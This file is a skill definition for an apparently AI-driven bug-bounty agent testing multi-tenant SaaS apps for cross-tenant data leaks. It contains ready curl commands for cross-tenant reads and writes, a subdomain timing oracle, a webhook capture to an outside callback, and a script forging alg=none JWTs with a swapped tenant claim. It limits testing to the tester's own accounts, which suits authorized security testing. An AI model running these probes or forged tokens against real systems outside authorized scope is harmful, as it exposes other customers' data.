---
name: tenant_isolation
agent: agent8_logic
description: Hunt cross-tenant data leaks, tenant-ID confusion, and tenant oracles that expose one customer's data to another.
---

# Tenant Isolation

## Purpose
Multi-tenant SaaS apps fail at the one boundary that matters most: keeping one customer's data away from another's. This skill systematically tests every tenant-identifier channel (subdomain, header, path prefix, JWT claim, cookie) for confusion and every list/search/webhook surface for cross-tenant reads, then ladders enumeration → read → write. A broken tenant boundary is a confidentiality breach against paying customers — a P1/HackerOne critical with real legal and reputational impact.

## Division of labor
- **Consumes:** tech-stack notes (headers, auth scheme, JWT structure from `stack_fingerprint` / `auth_model_analysis`); endpoint lists (`<host>_endpoints.txt` from `hidden_endpoint_discovery`); two test accounts on the same target (Attacker A and Victim B) provisioned during setup
- **Produces:** the finished artifact — `findings/tenant_isolation_confirmed.md` containing raw request/response pairs and verdicts

## When to use / when NOT to use
- **Use when:** the target serves multiple customers from one deployment (subdomain-per-tenant, tenant header, org/workspace switcher in UI, `tenant_id`/`org_id`/`workspace_id` in API responses or JWTs); list/search/report endpoints exist; webhooks or event streams exist
- **Skip when (time-pass filter):** the app is single-user with no tenant concept at all (no org, no workspace, no second account possible). Ask: does it leak? A tenant oracle that only reveals *existence* of a tenant with no data is weak — keep digging only if it chains to read or write. Cross-tenant reads of another user's own shared resources you both legitimately share is by-design, not a finding.

## Methodology
1. Inventory every tenant identifier channel. Probe: subdomain (`a.<HOST>` vs `b.<HOST>`), header (`X-Tenant-ID`, `X-Org-ID`), path prefix (`/t/<id>/...`), JWT claims (`tid`, `org`, `tenant`), cookies. Record which one the backend actually honors by sending conflicting pairs (header says A, JWT says B) — the honored channel is the one to attack.
2. Register Attacker A and Victim B accounts. Create distinct data in each (note with unique canary string `CANARY_B_<rand>` under B). Canary strings are how you prove whose data leaked.
3. Re-authenticate as A. Replay every list/search/export endpoint B can see, substituting B's identifiers into A's requests: `GET /api/v1/notes?tenant_id=<B_ID>` with A's token. Look for B's canary in A's responses — a read leak.
4. Test identifier confusion: endpoints that take tenant ID as a *parameter* but auth as *body/session*. Try A's valid token + `tenant_id=B` in query, body, and header variants. Many apps validate the token but trust the parameter.
5. Probe GraphQL: request a list query with an explicit `where: {tenantId: "<B_ID>"}` filter as A. Check whether the resolver enforces the caller's tenant or trusts the argument.
6. Test search endpoints: `GET /api/v1/search?q=<CANARY_B>` as A. Global search indexes are a classic cross-tenant leak — the index often ignores tenant scoping.
7. Test exports/reports: CSV/PDF export endpoints as A with B's tenant param. Exports frequently run through a different code path that drops the tenant filter.
8. Test webhook/event-stream endpoints: `GET /api/v1/events`, `/webhooks`, SSE streams as A — look for events carrying other tenants' IDs or payloads. Subscribe with a callback URL and trigger activity as B; see what arrives at A's webhook.
9. Hunt "super-tenant" admin endpoints: `/api/v1/admin/tenants`, `/internal/tenants`, `?all_tenants=true`. Try A's normal token; then try predictable admin paths from wordlists. A 200 with a tenant list is enumeration; a 200 with per-tenant data is the jackpot.
10. Build a tenant-existence oracle: request `https://<guess>.<HOST>/` and compare status codes/redirects/timing between a real tenant subdomain (B's) and a random one. A consistent difference (302 vs 404, distinct error JSON, timing delta >100ms over 20 samples) is a tenant enumeration oracle — note it, then try to chain it (does knowing a tenant slug unlock invite or password-reset flows scoped to it?).
11. Tamper the JWT tenant claim: decode A's JWT, flip `tid`/`org_id` to B's value, re-sign with alg=none or leave the signature intact and observe. If the backend reads the claim without verifying, you get B's context with A's login. (Do not forge tokens to access real customer data — use your own B account only.)
12. Test parallel identifier precedence: send A's session cookie + header `X-Tenant-ID: <B>` + path `/t/<B>/...` all at once with mismatched values. The channel that wins tells you which confusion attacks are viable; document the precedence order.
13. Attempt cross-tenant *write*: as A, `PUT /api/v1/notes/<B_NOTE_ID>` with A's token, `DELETE`, `POST /api/v1/notes` with `tenant_id: B`. A write proves full boundary collapse — verify by logging in as B and confirming the change landed.
14. Check IDOR-within-tenant vs cross-tenant: numeric IDs (`/api/v1/orders/1001` vs `/1002`) often lack *any* ownership check — distinguish "no check at all" (worse) from "tenant check only" in your notes.
15. Chain: tenant enumeration → cross-tenant read → cross-tenant write → role escalation inside B's tenant (invite yourself as admin via B's invite endpoint called with A's confused session).
16. Re-verify every positive twice from a clean session (fresh login for A), against a known-dead tenant ID (random UUID) as baseline, and confirm the canary string appears verbatim.

### Decision branches — what the response tells you to do next
- **Header honored over JWT/session:** the confusion channel is the header. Pivot immediately: replay every state-changing endpoint (PUT/POST/DELETE) as A with `X-Tenant-ID: <B>`. Headers are the easiest channel to spoof at scale — this is your primary ladder.
- **JWT honored, header ignored:** pivot to JWT claim tampering (step 11). If alg=none is accepted, you have full tenant impersonation — test write, then stop and document; never touch real customer tenants.
- **Search leaks B's canary:** the tenant filter is missing in the search path. Immediately test exports, GraphQL, webhooks, and reporting — the same missing filter is usually copy-pasted across all of them.
- **Read works, write blocked:** still a CONFIRMED read finding. Document the write-block as a partial mitigation and note it caps impact at confidentiality, not integrity.
- **Tenant oracle found (status/timing delta):** chain it — feed discovered slugs into invite-accept and password-reset endpoints scoped by tenant. An oracle alone is a note; an oracle that unlocks a scoped flow is a finding.
- **Every identifier ignored, only session tenant used:** the boundary holds at the identifier layer. Pivot to IDOR-within-tenant (step 14) and to `invite_onboarding_abuse` — confused invites are the remaining path in.
- **Inconsistent scoping (works on /notes, fails on /orders):** map the boundary per-endpoint in a table. Partial enforcement is common and each unenforced endpoint is its own CONFIRMED finding — do not stop at the first blocked one.
- **Error messages differ between own-tenant and foreign-tenant failures:** the error text itself is an oracle — diff `{"error":"not_found"}` vs `{"error":"forbidden"}` per endpoint and record which one leaks existence.
- **Tenant ID appears in shareable URLs (invite links, public pages):** fetch that URL as a complete outsider (no auth). Shared-link scoping bugs are tenant-isolation bugs wearing a UX mask.

## Exact commands
Baseline — known-dead tenant ID for comparison (expect 403/404 or empty):
```bash
curl -s -i 'https://<HOST>/api/v1/notes?tenant_id=00000000-0000-0000-0000-000000000000' \
  -H "Authorization: Bearer <TOKEN_A>" | head -40
```
Identifier-channel precedence probe (JWT says A, header says B):
```bash
curl -s -i 'https://<HOST>/api/v1/notes' \
  -H "Authorization: Bearer <TOKEN_A>" \
  -H "X-Tenant-ID: <TENANT_B>" | head -40
```
Cross-tenant search for B's canary as A:
```bash
curl -s -i 'https://<HOST>/api/v1/search?q=CANARY_B_<rand>' \
  -H "Authorization: Bearer <TOKEN_A>"
```
GraphQL tenant-filter trust test:
```bash
curl -s -i 'https://<HOST>/graphql' -X POST \
  -H "Authorization: Bearer <TOKEN_A>" -H 'Content-Type: application/json' \
  --data '{"query":"query { notes(where: {tenantId: \"<TENANT_B>\"}) { id title body } }"}'
```
Tenant-existence oracle timing (20 samples, compare real vs random subdomain):
```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" "https://<TENANT_B>.<HOST>/login"
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" "https://zz-noexist-9q8.<HOST>/login"
done | sort | uniq -c
```
JWT claim inspection:
```bash
python3 -c "
import base64, json
tok = '<TOKEN_A>'
payload = tok.split('.')[1] + '=='
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))"
```
Cross-tenant write verification (then log in as B and confirm):
```bash
curl -s -i -X PUT 'https://<HOST>/api/v1/notes/<B_NOTE_ID>' \
  -H "Authorization: Bearer <TOKEN_A>" -H 'Content-Type: application/json' \
  --data '{"title":"PWNED_BY_A"}'
```

# Identifier-precedence matrix: which channel wins when all disagree
curl -s -o /dev/null -w "path=B,header=A -> %{http_code}\n" \
  "https://<HOST>/t/<TENANT_B>/api/v1/notes" \
  -H "Authorization: Bearer <TOKEN_A>" -H "X-Tenant-ID: <TENANT_A>"
curl -s -o /dev/null -w "path=A,header=B -> %{http_code}\n" \
  "https://<HOST>/t/<TENANT_A>/api/v1/notes" \
  -H "Authorization: Bearer <TOKEN_A>" -H "X-Tenant-ID: <TENANT_B>"
# Webhook cross-tenant leak: subscribe as A, trigger activity as B, inspect callback
curl -s -X POST 'https://<HOST>/api/v1/webhooks' \
  -H "Authorization: Bearer <TOKEN_A>" -H 'Content-Type: application/json' \
  --data '{"url":"https://<YOUR_CALLBACK>/hook","events":["note.created"]}'
# ...then create a note as B, and inspect what arrives at <YOUR_CALLBACK> for B's tenant_id/payload

# Cookie-based tenant confusion: A's session + B's tenant cookie
curl -s -i 'https://<HOST>/api/v1/notes' \
  -H "Authorization: Bearer <TOKEN_A>" \
  -H "Cookie: session=<SESSION_A>; tenant_id=<TENANT_B>" | head -30
# JWT alg=none test (your own A/B accounts ONLY): strip signature, flip tid to B
python3 - <<'EOF'
import base64, json
tok = '<TOKEN_A>'
h, p, s = tok.split('.')
pad = lambda x: x + '=' * (-len(x) % 4)
payload = json.loads(base64.urlsafe_b64decode(pad(p)))
payload['tid'] = '<TENANT_B>'
none_tok = base64.urlsafe_b64encode(b'{"alg":"none"}').rstrip(b'=').decode() + '.' + \
           base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'
print(none_tok)
EOF
# then: curl -s -i 'https://<HOST>/api/v1/notes' -H "Authorization: Bearer $none_tok" | head -20

## Completion-bias defenses
- [ ] Every tenant identifier channel inventoried (subdomain, header, path, JWT claim, cookie) and precedence documented
- [ ] Two test accounts (A and B) created with unique canary strings under B
- [ ] All list/search/export endpoints replayed as A with B's identifiers
- [ ] GraphQL tenant filter trust tested
- [ ] Search-index cross-tenant leak tested
- [ ] Webhook/event stream tested for other-tenant payloads
- [ ] Super-tenant admin endpoints probed
- [ ] Tenant-existence oracle measured (status codes AND timing, 20 samples)
- [ ] JWT tenant-claim tampering tested (A's own accounts only)
- [ ] Cross-tenant write attempted and verified from B's session
- [ ] Every positive reproduced 2x from clean sessions against the dead-tenant baseline
- [ ] `findings/tenant_isolation_confirmed.md` exists on disk with raw pairs and verdicts
- [ ] Decision branches followed — pivoted on what the responses actually showed, not the original plan
- [ ] No CONFIRMED verdict rests on a single unrepeated 200; every read names the exact endpoint and shows the canary verbatim
- [ ] Partial-enforcement mapped per-endpoint — did not stop at the first blocked surface
- [ ] Error-message differentials recorded per endpoint (not_found vs forbidden as existence oracle)
- [ ] Public/shared-link tenant URLs tested fully unauthenticated
- **Review step:** agent10_review must verify: (a) the finished artifact exists and contains full raw request/response pairs, not summaries; (b) every CONFIRMED verdict shows the canary string verbatim in the response AND the dead-tenant baseline returning 403/404/empty; (c) no finding relies on data both accounts legitimately share; (d) no real third-party customer data was touched.
- **Nudge prompts:** "Keep going until you have tested every tenant identifier channel, not just the first one that responded." / "Do not report done before findings/tenant_isolation_confirmed.md exists on disk with raw pairs." / "A tenant oracle with no chained read is a note, not a finding — keep laddering."
- **Finished artifact definition:** `findings/tenant_isolation_confirmed.md` with one section per tested surface, raw request/response pairs, the identifier-precedence table, the oracle measurement table, and a verdict (CONFIRMED / INCONCLUSIVE / NEGATIVE) per surface.

## Evidence standard
- Baseline: compare every hit against a known-dead tenant ID (random UUID) on the same host — the dead tenant must return 403/404/empty while the confused request returns B's data
- Reproduction: 2x independent reproduction required, each from a fresh login session for A
- Raw evidence: full request/response pairs saved, with B's canary string highlighted verbatim
- Verdicts: CONFIRMED (canary leaks twice vs clean baseline) / INCONCLUSIVE (inconsistent scoping, needs a second model run or human) / NEGATIVE (tenant boundary held — documented with the baseline pair so nobody re-tests it)

### Worked verdict example
- CONFIRMED: `GET /api/v1/search?q=CANARY_B_x7k2` as A returned B's note containing `CANARY_B_x7k2` verbatim, twice from fresh logins; the dead-tenant baseline returned `{"results":[]}`. Canary + clean baseline = CONFIRMED cross-tenant read.
- INCONCLUSIVE: `?tenant_id=<B>` leaked B's notes once, then 403 after re-login — inconsistent scoping; needs a second run before claiming.
- NEGATIVE: every confused request returned `403 {"error":"tenant_mismatch"}` while A's own requests returned 200 — boundary held; pair saved so nobody re-tests it.

## Handoffs
- `agent10_review` consumes `findings/tenant_isolation_confirmed.md` and verifies every CONFIRMED verdict against the evidence standard before the report ships.
- `invite_onboarding_abuse` consumes the identifier-precedence table and any tenant oracle: knowing a tenant slug plus weak invites = tenant takeover chain.
- `state_machine_audit` consumes cross-tenant write primitives (if state transitions are tenant-scoped, a confused session may force illegal transitions in another tenant).
- The final report writer needs: impact framing (whose data, what kind — PII, financial, secrets), the escalation ladder achieved (enum → read → write), and the exact reproduction commands.
- `pii_hunter` consumes confirmed cross-tenant read endpoints: it classifies exactly what crossed the boundary (PII, secrets, financial data) to set severity.
